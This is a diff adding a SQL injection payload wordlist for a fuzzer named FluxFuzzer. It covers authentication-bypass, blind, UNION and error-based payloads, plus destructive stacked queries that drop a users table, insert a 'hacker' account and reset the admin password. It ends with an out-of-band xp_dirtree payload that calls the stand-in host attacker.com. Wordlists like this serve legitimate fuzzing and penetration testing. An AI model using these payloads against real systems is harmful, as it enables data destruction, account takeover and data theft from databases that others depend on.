@@ -1,0 +1,78 @@
+# SQL Injection Payloads
+# FluxFuzzer SQLi Wordlist
+
+# Basic SQLi
+'
+"
+`
+''
+""
+``
+;
+;--
+;#
+'--
+'#
+"--
+"#
+'/*
+"/*
+--
+#
+/**/
+
+# Classic SQLi
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+' OR 1=1--
+" OR "1"="1
+" OR "1"="1"--
+' OR ''='
+" OR ""="
+' OR 'x'='x
+' OR 1=1#
+1' OR '1'='1
+1" OR "1"="1
+
+# Boolean-based blind
+' AND '1'='1
+' AND '1'='2
+' AND 1=1
+' AND 1=2
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1'--
+1' AND '1'='2'--
+
+# Time-based blind
+'; WAITFOR DELAY '0:0:5'--
+'; SLEEP(5)#
+' OR SLEEP(5)#
+'; pg_sleep(5)--
+1; WAITFOR DELAY '0:0:5'--
+1 OR SLEEP(5)#
+
+# UNION-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT @@version--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT 1,2,3--
+
+# Error-based
+' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--
+' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--
+
+# Stacked queries
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','password')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+
+# Out-of-band (OOB)
+'; EXEC xp_dirtree '\\attacker.com\share'--
